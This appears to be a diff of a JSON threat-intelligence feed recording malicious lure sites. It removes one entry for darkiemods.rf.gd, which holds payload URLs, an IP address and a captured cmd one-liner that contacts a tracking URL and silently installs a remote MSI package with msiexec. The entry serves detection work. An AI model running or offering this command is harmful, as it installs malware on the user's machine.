@@ -2928,27 +2928,5 @@
     ],
     "ReportId": "cmwczsy7h0fjp0omltp7h00pn",
     "ScannedAt": "2026-11-12T03:32:54.965000+00:00"
-  },
-  {
-    "UrlDomain": "darkiemods.rf.gd",
-    "DeliveryUrl": [
-      "xedplay.com",
-      "distnode.biz"
-    ],
-    "PayloadUrl": [
-      "https://xedplay.com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6",
-      "https://distnode.biz/radar-cover-probe/named"
-    ],
-    "IP": [
-      "185.27.134.33"
-    ],
-    "Related": [],
-    "Payload": "cmd /c \"curl -s -o NUL https://xedplay[.]com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6 & msiexec /q /i https://distnode[.]biz/radar-cover-probe/named\"",
-    "ResolvedDownloadUrl": [
-      "https://xedplay.com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6",
-      "https://distnode.biz/radar-cover-probe/named"
-    ],
-    "ReportId": "cmwcylu3c0fav0oml4xhetl84",
-    "ScannedAt": "2026-11-12T02:59:24.496000+00:00"
   }
 ]
